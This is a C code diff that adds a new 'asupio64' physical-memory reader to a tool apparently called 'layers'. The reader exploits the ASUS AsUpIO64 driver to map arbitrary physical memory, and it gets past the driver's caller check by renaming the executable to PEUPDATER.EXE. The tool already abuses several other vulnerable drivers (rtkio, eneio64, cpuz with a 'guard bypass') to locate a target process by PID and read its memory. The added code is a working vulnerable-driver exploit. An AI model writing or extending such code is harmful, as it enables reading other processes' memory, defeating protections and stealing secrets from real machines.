@@ -213,6 +213,48 @@ static int read_mrt(mb_phys_reader *r, uint64_t pa, void *buf, uint32_t size) {
     return DeviceIoControl(r->dev, 0x70F8800Cu, in, sizeof(in), buf, size, &ret, NULL) ? 1 : 0;
 }
 
+// ---- 取数层 provider: ASUS AsUpIO64 (EZ Update 3.00.03) physical map ----
+// Device \\.\AsUpdateio. IRP_MJ_CREATE checks that the current process image
+// path contains "\PEUPDATER.EXE" (copy/rename layers.exe to PEUPDATER.EXE).
+// IOCTL 0xA040A480 (static-derived from FUN_000117f4):
+//   input 24B {u32 interfaceType; u32 busNumber; u64 phys_start; u32 addressSpace; u32 size}
+//   output  {u32 user_va}  (driver ZwMapViewOfSection(\Device\PhysicalMemory))
+// NOTE: statically derived; behavior needs dynamic verification once loaded.
+static int asupio64_build_map_request(uint64_t pa, uint32_t size, uint8_t out[24]) {
+    if (!out || !size) return 0;
+    uint64_t page = pa & ~0xFFFull;
+    uint64_t end = pa + size;
+    uint64_t page_end = (end + 0xFFF) & ~0xFFFull;
+    uint64_t map_size = page_end - page;
+    if (map_size > 0x1000000) return 0;
+    memset(out, 0, 24);
+    *(uint32_t *)(out + 0) = 1;                 // InterfaceType = Internal
+    *(uint32_t *)(out + 4) = 0;                 // BusNumber
+    *(uint64_t *)(out + 8) = page;              // physical start (4KB aligned)
+    *(uint32_t *)(out + 16) = 0;                // AddressSpace = memory
+    *(uint32_t *)(out + 20) = (uint32_t)map_size;
+    return 1;
+}
+
+static int read_asupio64(mb_phys_reader *r, uint64_t pa, void *buf, uint32_t size) {
+    if (r->dev == INVALID_HANDLE_VALUE || !buf || !size) return 0;
+    uint8_t in[24];
+    uint8_t out[8];
+    DWORD ret = 0;
+    if (!asupio64_build_map_request(pa, size, in)) return 0;
+    memset(out, 0, sizeof(out));
+    if (!DeviceIoControl(r->dev, 0xA040A480u, in, sizeof(in), out, sizeof(out), &ret, NULL))
+        return 0;
+    uint64_t uva = *(uint64_t *)out;
+    if (uva < 0x10000) {
+        uint32_t uva32 = *(uint32_t *)out;
+        if (uva32 < 0x10000) return 0;
+        uva = uva32;
+    }
+    memcpy(buf, (void *)(uintptr_t)(uva + (pa & 0xFFF)), size);
+    return 1;
+}
+
 static int reader_open(mb_phys_reader *r, const char *kind, const char *device) {
     memset(r, 0, sizeof(*r));
     r->dev = INVALID_HANDLE_VALUE;
@@ -268,8 +310,17 @@ static int reader_open(mb_phys_reader *r, const char *kind, const char *device) 
             r->dev = CreateFileA(names[i], GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE,
                                  NULL, OPEN_EXISTING, 0, NULL);
         }
+    } else if (_stricmp(kind, "asupio64") == 0) {
+        r->name = "asupio64";
+        r->mode = 7;
+        r->read = read_asupio64;
+        r->dev = CreateFileA(device ? device : "\\\\.\\AsUpdateio",
+                             GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE,
+                             NULL, OPEN_EXISTING, 0, NULL);
+        if (r->dev == INVALID_HANDLE_VALUE)
+            fprintf(stderr, "[HINT] AsUpIO64 gate: run layers.exe renamed/copied as PEUPDATER.EXE\n");
     } else {
-        fprintf(stderr, "[ERR] unknown reader '%s' (mock|cchwapi|rtkio|eneio64|asrdrv|mrt|cpuz)\n", kind ? kind : "");
+        fprintf(stderr, "[ERR] unknown reader '%s' (mock|cchwapi|rtkio|eneio64|asrdrv|mrt|cpuz|asupio64)\n", kind ? kind : "");
         return 0;
     }
     if (r->dev == INVALID_HANDLE_VALUE) {
@@ -720,6 +771,16 @@ static int selftest_mock(void) {
     int ok_unmapped = !mb_layer_translate(&r, cr3, 0x800000, &bad_pa, &bad_ps);
     check("翻译层(translator)", "unmapped VA=0x800000 rejected", ok_unmapped);
 
+    // AsUpIO64 provider request layout (offline, no driver): page-aligned map range
+    uint8_t map_req[24];
+    int ok_asup = asupio64_build_map_request(0x12345678, 0x100, map_req) &&
+                  *(uint32_t *)(map_req + 0) == 1 &&
+                  *(uint32_t *)(map_req + 4) == 0 &&
+                  *(uint64_t *)(map_req + 8) == 0x12345000ull &&
+                  *(uint32_t *)(map_req + 16) == 0 &&
+                  *(uint32_t *)(map_req + 20) == 0x1000;
+    check("取数层(fetcher)", "asupio64 map request layout (page-aligned)", ok_asup);
+
     // 定位层 alone (physical EPROCESS scan, no kernel reader)
     uint64_t located_cr3 = 0, eproc = 0;
     int ok_loc = mb_layer_locate_cr3_scan(&r, 0x8000, 0x1000, 4242, "MOCK.exe",
@@ -784,13 +845,14 @@ static void usage(void) {
     printf("Usage:\n");
     printf("  layers --selftest-mock\n");
     printf("  layers --ranges                       (read physical RAM ranges from registry)\n");
-    printf("  layers --reader <cchwapi|rtkio|eneio64|asrdrv|mrt|cpuz> [--device <path>] --read-phys --pa <hex> --size <n>\n");
-    printf("  layers --reader <cchwapi|rtkio|eneio64|asrdrv|mrt|cpuz> [--device <path>] --cr3 <hex> --va <hex> --size <n>\n");
-    printf("  layers --reader <cchwapi|rtkio|eneio64|asrdrv|mrt|cpuz> [--device <path>] --locate --pid <pid> --scan-start <hex> --scan-size <hex> [--name <exe>]\n");
-    printf("  layers --reader <cchwapi|rtkio|eneio64|asrdrv|mrt|cpuz> [--device <path>] --locate --pid <pid> --auto-ranges [--name <exe>]\n");
+    printf("  layers --reader <cchwapi|rtkio|eneio64|asrdrv|mrt|cpuz|asupio64> [--device <path>] --read-phys --pa <hex> --size <n>\n");
+    printf("  layers --reader <cchwapi|rtkio|eneio64|asrdrv|mrt|cpuz|asupio64> [--device <path>] --cr3 <hex> --va <hex> --size <n>\n");
+    printf("  layers --reader <cchwapi|rtkio|eneio64|asrdrv|mrt|cpuz|asupio64> [--device <path>] --locate --pid <pid> --scan-start <hex> --scan-size <hex> [--name <exe>]\n");
+    printf("  layers --reader <cchwapi|rtkio|eneio64|asrdrv|mrt|cpuz|asupio64> [--device <path>] --locate --pid <pid> --auto-ranges [--name <exe>]\n");
     printf("  layers --reader ... --locate --pid <pid> (--scan-start/--scan-size | --auto-ranges) --va <hex> --size <n>\n");
     printf("  layers --locate --kkyum --pid <pid> [--kkyum-device <path>]   (kernel-VA locator; no physical reader needed)\n");
     printf("  note: --reader cpuz requires --expect-first <dword> (target page first dword, guard bypass)\n");
+    printf("  note: --reader asupio64 requires layers.exe to be named PEUPDATER.EXE (AsUpIO64 gate)\n");
 }
 
 int main(int argc, char **argv) {
